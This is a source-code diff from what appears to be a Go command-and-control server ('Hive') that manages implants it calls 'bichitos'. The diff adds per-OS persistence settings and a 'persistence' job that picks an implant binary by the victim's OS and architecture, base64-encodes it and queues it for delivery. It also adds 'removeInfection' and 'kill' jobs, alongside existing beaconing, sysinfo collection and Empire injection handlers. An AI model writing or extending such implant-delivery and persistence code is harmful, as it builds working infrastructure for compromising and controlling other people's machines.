@@ -21,6 +21,8 @@ import (
 	"bytes"
 	"time"
 	"encoding/json"
+    "io/ioutil"
+    "encoding/base64"
 
 )
 
@@ -34,9 +36,15 @@ type CreateImplant struct {
     Resptime string   `json:"resptime"`
     Coms string   `json:"coms"`
     ComsParams string `json:"comsparams"`
-    Persistence string `json:"persistence"`
+    PersistenceOsx string `json:"persistenceosx"`
+    PersistenceOsxP string `json:"persistenceosxp"`
+    PersistenceWindows string `json:"persistencewindows"`
+    PersistenceWindowsP string `json:"persistencewindowsp"`
+    PersistenceLin string `json:"persistencelinux"`
+    PersistenceLinP string `json:"persistencelinuxp"`
     Redirectors  []Red `json:"redirectors"`
 }
+
 
 type Red struct{
     Vps string `json:"vps"`
@@ -105,7 +113,7 @@ func jobProcessor(jobO *Job){
     			// Error Log
     			if errD != nil {
 					setJobStatusDB(jid,"Error")
-					setJobResultDB(jid,"Hive-createImplant(Command JSON Decoding Error)")
+					setJobResultDB(jid,"Hive-createImplant(Command JSON Decoding Error):"+errD.Error())
 					return
     			}
 
@@ -142,7 +150,8 @@ func jobProcessor(jobO *Job){
 					return
 				}
 
-				errI := createImplant(commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.Persistence,commandO.Redirectors)
+				errI := createImplant(commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.PersistenceOsx,commandO.PersistenceOsxP,commandO.PersistenceWindows,commandO.PersistenceWindowsP,commandO.PersistenceLin,commandO.PersistenceLinP,commandO.Redirectors)
+				
 				if errI != ""{
 					removeImplant(commandO.Name)
 					setJobStatusDB(jid,"Error")
@@ -628,7 +637,7 @@ func jobProcessor(jobO *Job){
 	
 		switch job{
 
-			//Jobs triggered by implants/bichitos themselves
+			//Deprecated, BiPing can do everything
 			case "BiChecking":
 
    				//BiCHecking is a encoded bot info for future use
@@ -645,6 +654,7 @@ func jobProcessor(jobO *Job){
    				setBiRidDB(chid,pid)
 				return
 
+			//Main Beacon of Implants, will be used to Update the bot and its redirector
 			case "BiPing":
 
 				existB,_ := existBiDB(chid)
@@ -655,7 +665,7 @@ func jobProcessor(jobO *Job){
 				//Check SysInfo, if empty, craft a new Job to retrieve it
 				bichito := getBichitoDB(chid)
 				if (bichito.Info == "") {
-					fmt.Println("Adding Sysinfo...")
+					//fmt.Println("Adding Sysinfo...")
    				
 					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}
 
@@ -665,7 +675,7 @@ func jobProcessor(jobO *Job){
 				}
 
 				//Debug:
-				fmt.Println("Adding Received...")
+				//fmt.Println("Adding Received...")
 				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
 
 				jobsToProcess.mux.Lock()
@@ -702,7 +712,7 @@ func jobProcessor(jobO *Job){
    				setBiLastCheckedbyBidDB(chid,time)
    				setBiRidDB(chid,pid)
 				return
-				
+			
 			////Jobs Triggered by users
 			//Implant Lifecycle
 			
@@ -714,6 +724,98 @@ func jobProcessor(jobO *Job){
 				return
 
 			case "ttl":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+
+			//Get target Implant and send it for bichito persistence
+			case "persistence":
+
+				existB,_ := existBiDB(chid)
+				if !existB{
+					biChecking(chid,pid,parameters)
+				}
+
+				//Check SysInfo, if empty, craft a new Job to retrieve it
+				bichito := getBichitoDB(chid)
+				if (bichito.Info == "") {
+   				
+					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Sending","",""}
+
+					jobsToProcess.mux.Lock()
+					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
+					jobsToProcess.mux.Unlock()
+					return
+				}
+
+				//Parse sysinfo and get target OS and architecture
+				var biInfo *SysInfo
+				errDaws := json.Unmarshal([]byte(bichito.Info),&biInfo)
+				if errDaws != nil {
+    				time := time.Now().Format("02/01/2006 15:04:05 MST")
+					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errDaws.Error())
+					addLogDB("Hive",time,elog)
+					return
+				}
+
+				x64 := strings.Contains(biInfo.Arch,"64")
+				x32 := strings.Contains(biInfo.Arch,"86")
+
+				windows := strings.Contains(biInfo.Os,"windows")
+				linux := strings.Contains(biInfo.Os,"linux")
+				darwin := strings.Contains(biInfo.Os,"darwin")
+
+				var implantPath string
+
+				switch{
+					case (x32 && windows):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32"
+					case (x64 && windows):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx64"
+					case (x32 && linux):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx32"
+					case (x64 && linux):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx64"
+					case (x32 && darwin):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx32"
+					case (x64 && darwin):
+						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx64"
+					default:
+					    time := time.Now().Format("02/01/2006 15:04:05 MST")
+						elog := fmt.Sprintf("Error in persistence for: "+chid+" no executablePath found.")
+						addLogDB("Hive",time,elog)
+						return	
+				}
+
+
+        		//Get Target Implant
+        		implant, err := ioutil.ReadFile(implantPath)
+        		if err != nil {
+    				time := time.Now().Format("02/01/2006 15:04:05 MST")
+					elog := fmt.Sprintf("Persistence by "+chid+": Error reading implant"+err.Error())
+					addLogDB("Hive",time,elog)
+					return
+        		}
+
+        		//Set the output of the file on "Result"
+        		jobO.Result = base64.StdEncoding.EncodeToString(implant)
+
+    			jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+
+				return
+
+			case "removeInfection":
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+
+			case "kill":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
@@ -787,6 +889,7 @@ func jobProcessor(jobO *Job){
 				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
 				jobsToProcess.mux.Unlock()
 				return
+
 			
 			//Staging/POST Actions
 			case "injectEmpire":
@@ -818,6 +921,8 @@ func jobProcessor(jobO *Job){
     			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
 				jobsToProcess.mux.Unlock()
 				return
+
+			//SYSTEM Jobs
 
 			default:
 				time := time.Now().Format("02/01/2006 15:04:05 MST")
